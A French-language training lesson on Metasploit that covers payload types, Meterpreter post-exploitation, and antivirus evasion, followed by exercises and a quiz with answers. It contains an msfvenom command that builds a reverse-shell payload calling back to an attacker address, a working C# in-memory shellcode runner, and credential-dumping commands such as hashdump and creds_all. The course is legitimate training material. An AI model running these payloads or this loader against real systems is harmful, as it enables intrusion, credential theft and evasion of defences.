# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 202 (6h) : Exploitation de Vulnérabilités & Metasploit Framework (Payloads, Meterpreter, MSFvenom & Évasion AV)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'utilisation du framework d'exploitation **Metasploit (MSF)** : structure des modules (Exploits, Payloads, Auxiliaries, Nops), distinction entre payloads **Staged** et **Non-Staged**, utilisation avancée du shell interactif **Meterpreter**, création d'exécutables malveillants personnalisés avec **MSFvenom**, et techniques de base d'**évasion Antivirus (AV Evasion / Obfuscation)**.
>
> **Compétences visées :** `SEC-06` (A) — Exploitation Metasploit & Payloads Meterpreter | `SEC-04` (A) — AV Evasion & EDR Bypass Techniques

---

## 1) Module — Metasploit Framework & Architecture des Modules (2h)

### 📖 Narration/Intuition

Une fois les vulnérabilités identifiées lors de la phase de reconnaissance, la phase d'**Exploitation** consiste à utiliser un bout de code (l'**Exploit**) pour tirer parti de la faille de sécurité et injecter un code malveillant (le **Payload**) sur la machine cible.

**Metasploit Framework (MSF)** est le framework d'exploitation open-source le plus puissant au monde. Il standardise les exploits et les payloads, permettant de combiner n'importe quel exploit compatible avec n'importe quel payload.

### 🔍 Anatomie Technique

**Structure des Modules Metasploit :**

```
┌──────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
│                                                              │
│  ┌──────────────────┐  ┌──────────────────┐  ┌─────────────┐ │
│  │ 1. EXPLOITS      │  │ 2. PAYLOADS      │  │3. AUXILIARY │ │
│  │ (Code d'attaque  │  │ (Code exécuté    │  │(Scanners,   │ │
│  │  metasploit/...) │  │  après brèche)   │  │ Fuzzers)    │ │
│  └──────────────────┘  └──────────────────┘  └─────────────┘ │
│  ┌──────────────────┐  ┌──────────────────┐  ┌─────────────┐ │
│  │ 4. ENCODERS      │  │ 5. NOPS          │  │6. POST      │ │
│  │ (Obfuscation)    │  │ (Nop Sleds)      │  │(Pillaging)  │ │
│  └──────────────────┘  └──────────────────┘  └─────────────┘ │
└──────────────────────────────────────────────────────────────┘
```

**Distinction Payloads Staged vs Non-Staged :**

- **Payload Staged (ex: `windows/meterpreter/reverse_tcp`)** : Le payload initial envoyé par l'exploit est très petit (le *Stager*). Il se connecte en retour à la machine de l'attaquant pour télécharger le reste du payload complet (Meterpreter) en mémoire. *Indiqué par des slashs `/`*.
- **Payload Non-Staged (ex: `windows/meterpreter_reverse_tcp`)** : Le payload complet est envoyé d'un seul bloc dans l'exploit. Plus stable mais plus volumineux. *Indiqué par des underscores `_`*.

---

## 2) Module — Meterpreter & Post-Exploitation (2h)

### 📖 Narration/Intuition

**Meterpreter** est un payload de post-exploitation avancé spécifique à Metasploit. Contrairement à un simple shell de commande (`cmd.exe` ou `/bin/bash`), Meterpreter s'exécute entièrement **en mémoire RAM** (in-memory) en s'injectant dans un processus légitime (ex: `lsass.exe` ou `explorer.exe`). Il ne laisse **aucun fichier sur le disque dur**, rendant sa détection par les antivirus traditionnels très difficile.

### 🔍 Anatomie Technique

**Commandes Meterpreter Essentielles :**

```bash
# ── 1. INFORMATION & PRIVILÈGES
sysinfo                   # Informations système (OS, Architecture, Domaine)
getuid                    # Utilisateur actuel sous lequel s'exécute le payload
getsystem                 # Tentative d'escalade automatique vers SYSTEM (Windows)

# ── 2. MANIPULATION DE PROCESSUS & INJECTION
ps                        # Liste des processus en cours d'exécution
migrate <PID>             # Injecter Meterpreter dans un processus légitime (ex: explorer.exe)

# ── 3. RECOLTE D'IDENTIFIANTS (Pillaging)
hashdump                  # Extraction des hashes NTLM du registre SAM (Windows)
load kiwi                 # Charger le module Mimikatz dans Meterpreter
creds_all                 # Extraire tous les mots de passe et hashes en mémoire

# ── 4. PIVOTING & RÉSEAU
portfwd add -l 8080 -p 80 -r 10.10.10.50 # Redirection de port à travers la cible
run autoroute -s 10.10.10.0/24           # Ajouter une route réseau interne à Metasploit
```

---

## 3) Module — MSFvenom & Évasion Antivirus (AV Evasion) (2h)

### 📖 Narration/Intuition

Les antivirus modernes (Defender, Kaspersky, Symantec) possèdent des signatures pour tous les binaires générés par défaut avec Metasploit. Pour réussir un test d'intrusion Red Team, il faut utiliser **MSFvenom** pour générer des payloads sur-mesure, combinés à des techniques d'**obfuscation**, de **chiffrement (AES/XOR)** et d'**injection de shellcode**.

### 🛠️ Atelier Pratique

**Génération de Payloads avec MSFvenom & Shellcode Runner C# (`av_evasion.cs`) :**

```bash
# 1. Générer un shellcode brut (raw) chiffré en C#
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f csharp \
  -o shellcode.cs
```

**Wrapper C# d'Évasion AV — Injection de Shellcode en Mémoire (`runner.cs`) :**

```csharp
using System;
using System.Runtime.InteropServices;

namespace AEVasionRunner {
    class Program {
        // Importation des APIs Win32 pour l'allocation mémoire native
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        static void Main(string[] args) {
            // Shellcode chiffré généré par MSFvenom (Exemple)
            byte[] buf = new byte[512] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, /* ... */ };

            // 1. Allouer de la mémoire exécutable (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x40);

            // 2. Copier le shellcode dans la mémoire allouée
            Marshal.Copy(buf, 0, addr, buf.Length);

            // 3. Exécuter le shellcode dans un nouveau thread distinct
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // 4. Attendre l'exécution
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **MSF** | Metasploit Framework — Plateforme standard d'exploitation de vulnérabilités |
| **Meterpreter** | Payload avancé in-memory de post-exploitation de Metasploit |
| **AV Evasion** | Antivirus Evasion — Ensemble de techniques visant à contourner la détection antivirus |
| **Stager** | Petit binaire initial chargé de télécharger le payload principal en mémoire |
| **NOP Sled** | NOP Slide — Suite d'instructions NOP (`0x90`) menant à l'exécution du shellcode |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence entre un payload **Staged** (`windows/meterpreter/reverse_tcp`) et un payload **Non-Staged** (`windows/meterpreter_reverse_tcp`) dans Metasploit ?

**Corrigé :** Un payload **Staged** utilise une approche en deux étapes : l'exploit injecte un tout petit binaire (le *Stager*) sur la cible. Ce Stager s'exécute, ouvre une connexion réseau vers l'attaquant (LHOST/LPORT), et **télécharge en mémoire RAM** le gros binaire de post-exploitation (Meterpreter). Avantage : l'exploit initial nécessite très peu de place. Inconvénient : nécessite deux échanges réseau distincts (détectables par les IDS). Un payload **Non-Staged** contient **l'intégralité** du code Meterpreter dans un seul binaire massif envoyé par l'exploit d'un coup. Avantage : plus stable et autonome. Inconvénient : taille beaucoup plus importante qui ne rentre pas dans tous les buffers d'exploit.

**Exercice 2 :** Pourquoi le payload **Meterpreter** est-il dit "in-memory" (en mémoire) et quel est l'avantage majeur pour l'évasion des antivirus traditionnels ?

**Corrigé :** Meterpreter s'exécute entièrement dans l'espace mémoire (RAM) du système d'exploitation sans jamais **écrire de fichier binaire `.exe` ou `.dll` sur le disque dur** (Fileless Malware). De plus, il utilise la technique de la migration de processus (`migrate`) pour s'injecter dans la mémoire d'un processus système légitime déjà approuvé (ex: `explorer.exe`, `svchost.exe`). Les antivirus traditionnels basés sur les signatures de fichiers analysent principalement les fichiers écrits sur le disque. En restant exclusivement en mémoire RAM et masqué dans un processus légitime, Meterpreter contourne totalement les scans antivirus sur disque (On-Disk Scans).

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans Metasploit, quel composant représente le code d'attaque spécifique qui exploite la faille de sécurité, par opposition au code exécuté une fois la brèche ouverte ?
- A) L'Exploit
- B) Le Payload
- C) L'Auxiliary
- D) L'Encoder

**Réponse : A**

**Q2 :** Quelle commande Meterpreter permet d'injecter la session courante dans la mémoire d'un processus Windows légitime (ex: `explorer.exe`) pour stabiliser l'accès et masquer le payload ?
- A) `migrate <PID>`
- B) `getsystem`
- C) `sysinfo`
- D) `hashdump`

**Réponse : A**

**Q3 :** Quel outil de la suite Metasploit est utilisé en ligne de commande pour générer des payloads exécutables autonomes (ex: `.exe`, `.elf`, `.aspx`) ?
- A) MSFvenom
- B) MSFconsole
- C) Armitage
- D) Nmap

**Réponse : A**

**Q4 :** Pourquoi les payloads "Fileless" (sans fichier) qui s'exécutent uniquement en mémoire RAM contournent-ils facilement les antivirus traditionnels ?
- A) Car les antivirus traditionnels analysent principalement les fichiers écrits sur le disque dur et ne scannent pas en continu la RAM des processus légitimes
- B) Car la RAM est chiffrée par défaut
- C) Car les antivirus s'arrêtent dès que le réseau est activé
- D) Car Metasploit désactive automatiquement l'antivirus

**Réponse : A**

**Q5 :** Quel module Metasploit permet d'extraire les hashes de mots de passe NTLM de la base SAM d'un système Windows compromis ?
- A) `hashdump`
- B) `ps`
- C) `sysinfo`
- D) `clearev`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
